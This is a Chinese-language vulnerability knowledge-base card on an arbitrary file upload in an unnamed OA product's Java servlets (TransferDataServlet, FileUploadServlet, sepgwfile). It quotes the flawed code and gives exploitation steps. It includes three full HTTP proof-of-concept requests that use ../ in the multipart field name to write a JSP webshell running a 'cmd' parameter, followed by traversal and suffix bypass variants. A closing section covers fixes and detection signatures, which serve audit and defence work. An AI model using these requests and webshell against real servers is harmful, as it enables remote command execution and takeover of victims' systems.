---
id: web-generic-file-upload-oa-jsf-transferdata-attachfile-getfieldname-traversal
title: OA JSF 上传：getFieldName 拼入保存名 + 原始文件名后缀可控，路径穿越写 JSP
type: scenario
domain: web
path: web/generic/file-upload
technique: multipart-getfieldname-traversal-original-suffix-webshell
tags:
- java
- servlet
- file-upload
- path-traversal
- webshell
- multipart
- oa
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V59
  verified_at: '2026-11-05T09:14:47+08:00'
  notes: 已对照原文与54张图核对：图40-42 TransferDataServlet.transferData 用 DiskFileItemFactory 解析、else 分支 new AttachFile 并 saveFile2TempPath；图42 第213行取原始文件名后缀、第218行 serverFileName=timestr+getFieldName()+suffix、write(savePath+serverFileName)；图45-47 AttachFileBean.getUploadFiles 同样解析并 saveFile2TempPath，第648行后缀、第663行同名拼接；图48 sepgwfile 固定 D:/temp/fsp/<bustype>/<mid>、文件名时间戳+随机数+后缀，不含字段名；图49/52 路由与图44 TransferDataServlet 映射均与原文一致。字段名穿越与原始后缀可控链成立，卡内已注明时间戳前缀可能粘连 ../ 的细节。未验证点：PoC 未在真实目标执行，保存目录/穿越层级需按部署调整；原文无产品名/版本/CVE，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-upload/web-generic-file-upload-oa-jsf-transferdata-attachfile-getfieldname-traversal/
draft: false
kb_aliases:
- TransferDataServlet 任意文件上传
- AttachFileBean 上传绕过
- getFieldName 路径穿越
- 表单字段名文件上传
- 原始文件名后缀可控
- OA 上传 JSP
- saveFile2TempPath 穿越
---

## 一句话结论

OA 的上传 Servlet 用 commons-fileupload 解析 multipart 后，把 **multipart 表单字段名 `FileItem.getFieldName()`** 直接拼进保存文件名，后缀又取自**客户端原始文件名**；字段名可含 `../` 做路径穿越，原始文件名 `shell.jsp` 提供 `.jsp` 后缀，从而把 JSP 写到 Web 根下 getshell。

## 原理

- **`TransferDataServlet.transferData`**
  ```java
  DiskFileItemFactory factory = new DiskFileItemFactory();
  factory.setRepository(new File(OAConstant.TEMP_PATH));
  ServletFileUpload upload = new ServletFileUpload(factory);
  List dataItemList = upload.parseRequest(request);
  for (FileItem item : dataItemList) {
      if (item.isFormField()) { ... }
      else {
          AttachFile attach = new AttachFile();
          attach.setSfilename(item.getName());          // 原始文件名，仅用于取后缀
          ...
          TransferDataServlet.saveFile2TempPath(item, OAConstant.TEMP_PATH, attach);
      }
  }
  ```
- **`saveFile2TempPath` 的命名逻辑**
  ```java
  String suffix = "";
  if (attachFile.getSfilename().lastIndexOf(".") != -1) {
      suffix = attachFile.getSfilename().substring(attachFile.getSfilename().lastIndexOf("."));
  }
  String timestr = format.format(System.currentTimeMillis()) + "_" + (int)(Math.random() * 1000);
  String serverFileName = timestr + file.getFieldName() + suffix;
  file.write(new File(savePath + serverFileName));
  ```
  - `file.getFieldName()` 是 multipart 每个 part 的 `name=` 属性，完全由客户端控制；
  - `suffix` 取自原始文件名最后一个 `.` 之后（含点），`shell.jsp` → `.jsp`；
  - 保存路径 = `TEMP_PATH` + 时间戳随机串 + 字段名 + 后缀，未做 `basename`、未过滤 `../`、未做后缀白名单。
- **`AttachFileBean.getUploadFiles`**
  - 同样使用 `DiskFileItemFactory`/`ServletFileUpload` 解析，遍历 `DiskFileItem`；对满足 `getFieldName()` 非空且以 `_WORK_FILE` 等结尾的表单字段走表单处理，其余文件项调用 `saveFile2TempPath`。
  - 该版本的 `saveFile2TempPath` 同样用 `attach.getSfilename()` 取后缀、用 `file.getFieldName()` 拼保存名；`FileUploadServlet.doPost` 从 session 取/建 `AttachFileBean` 后直接调用 `getUploadFiles(request)`，路由为 `/.../attach/fileServlet`、`/.../office/fileServlet`。
- **`PubilcFuncions.sepgwfile`（第三个上传 sink）**
  - 保存目录固定为 `D:\temp\fsp\<bustype>\<mid>`（`bustype` 由 `wjlx` 经 `genparalx` 映射），文件名 = 时间戳 + 随机数 + `.` + 原始文件名后缀；
  - 后缀完全可控（`shell.jsp` → `jsp`），但没有字段名/原始文件名参与路径，不能直接穿越；文件名随机且目录是否 Web 可达取决于部署，作为变体看待。
- **为什么能 getshell**：保存目录若位于 Web 根（或可通过 `../` 跳到 `webapps/ROOT` 等可解析 JSP 的目录），写入的 `.jsp` 被容器当脚本执行；后缀只来自原始文件名，无白名单，`.jsp`/`.jspx`/`.JSP` 均可。
- **关于时间戳前缀的细节**：保存名是“时间戳_随机数 + 字段名 + 后缀”的纯字符串拼接，字段名里的第一个 `../` 可能与前缀粘成一个普通路径段（如 `20261105_123..`）。若目标的自定义 `write` 不自动创建父目录，需要调整 `../` 数量或字段名开头，使穿越段独立；若 `write` 会 `mkdirs`，则按常见 PoC 直接穿越即可。审计时应确认该写入工具方法的实现。

## 触发条件

- 目标存在 `TransferDataServlet` 或 `FileUploadServlet`（`AttachFileBean`）上传路由。
- 上传目录位于 Web 根下或可通过 `../` 到达可解析 JSP 的目录，应用进程对目标目录有写权限。
- 目标未对 `FileItem.getFieldName()`、原始文件名后缀、保存路径做白名单/规范化。
- 上传入口无需登录或可经鉴权绕过（`TransferDataServlet` 自身未做登录校验；`FileUploadServlet` 取决于外层 Filter）。

## 利用步骤

1. 确认上传路由：`POST /.../TransferDataServlet`（或其 `/*` 前缀）以及 `/.../attach/fileServlet`、`/.../office/fileServlet`。
2. 构造 multipart：文件 part 的 `name` 属性填入带 `../` 的路径片段，`filename` 填 `shell.jsp`，内容为 JSP webshell。
3. 观察响应是否成功；随后按保存目录结构访问写入的 JSP（如 `/upfile/.../shell.jsp?cmd=whoami`，或 `webapps/ROOT/shell.jsp`）。
4. 若文件名不可预测（`sepgwfile` 的随机名），先通过目录遍历/文件读取或数据库记录获取真实文件名，再访问。
5. 验证命令执行权限；不要在生产环境执行破坏性命令。

## PoC

`TransferDataServlet`（字段名穿越 + 原始文件名后缀）：

```http
POST /xxxxrDataServlet HTTP/1.1
Host: target-ip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySafe

------WebKitFormBoundarySafe
Content-Disposition: form-data; name="../../../webapps/ROOT/shell"; filename="any.jsp"
Content-Type: text/plain

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
------WebKitFormBoundarySafe--
```

`AttachFileBean`/`FileUploadServlet`：

```http
POST /xxxx/xxxxx/attach/fileServlet HTTP/1.1
Host: target-server
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryExp

------WebKitFormBoundaryExp
Content-Disposition: form-data; name="../../../shell"; filename="test.jsp"
Content-Type: text/plain

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
------WebKitFormBoundaryExp
Content-Disposition: form-data; name="_UPLOAD_FILE"

1
------WebKitFormBoundaryExp--
```

`PubilcFuncions.sepgwfile`（后缀可控，文件名随机）：

```http
POST /xxx/TranformdomoaServlet?wjlx=doc&orgTag=001 HTTP/1.1
Host: target-server.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryExp123
Content-Length: <len>

------WebKitFormBoundaryExp123
Content-Disposition: form-data; name="any_field_name"; filename="shell.jsp"
Content-Type: text/plain

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
------WebKitFormBoundaryExp123--
```

说明：以上 PoC 依据代码路径与常见保存目录构造，未在真实目标执行；`../` 数量、保存根目录和文件名前缀需按部署调整。

## 变体与关联

- **后缀变体**：`shell.jsp`、`shell.jspx`、`shell.JSP`（大小写）都可；若目标容器只解析 `.jsp`，优先用 `.jsp`；注意 `getSfilename().lastIndexOf(".")` 取的是最后一个点，双扩展名按最后一段处理。
- **路径穿越变体**：字段名可用 `../`、`..\`、`....//` 等；Windows 同时接受 `/` 与 `\`；若字段名被过滤，可尝试编码或利用时间戳前缀不创建目录的差异。
- **随机文件名变体**：`sepgwfile` 的文件名不可预测，但可通过文件读取/目录遍历获取；若目录不在 Web 根，需结合其他写入原语。
- 关联：[[web-generic-file-upload-oa-skey-filecase-netdisk-notice]]（另一类 OA 三处上传，原始文件名/后缀可控）；[[web-generic-file-upload-mes-uploadfilename-arbitrary-jsp]]（uploadFileName 信任导致 JSP 写入）；[[web-generic-file-upload-single-replace-dotdot-bypass]]（上传路径穿越的单次 replace 绕过）；[[web-generic-sqli-oa-jsf-tranformdomoa-multipart-field-sqli]]（同一 `TranformdomoaServlet` 的 SQL 注入分支）。

## 检测与防御

- **代码修复**：保存文件名只用服务端生成的 UUID/哈希 + 白名单后缀；`getFieldName()`、`getSfilename()` 仅用于业务展示，不参与路径；写入前 `Paths.get(base, name).normalize()` 并校验 `startsWith(base)`；后缀白名单（如仅 jpg/png/pdf）。
- **部署加固**：上传目录移出 Web 根，或关闭该目录的 JSP 解析；限制上传目录写权限；对 `TranformdomoaServlet`、`FileUploadServlet` 增加鉴权。
- **检测特征**：multipart 的 `name=` 属性含 `../`、`..\`、`/`；`filename` 为 `.jsp`/`.jspx`/`.JSP`；上传目录出现新增脚本文件；访问日志中出现刚写入文件的 GET/执行请求；`TranformdomoaServlet` 的 `wjlx` 与文件字段异常组合。
- **应急**：隔离上传目录，删除恶意脚本；审计上传记录与访问日志；修复后回归正常附件上传。
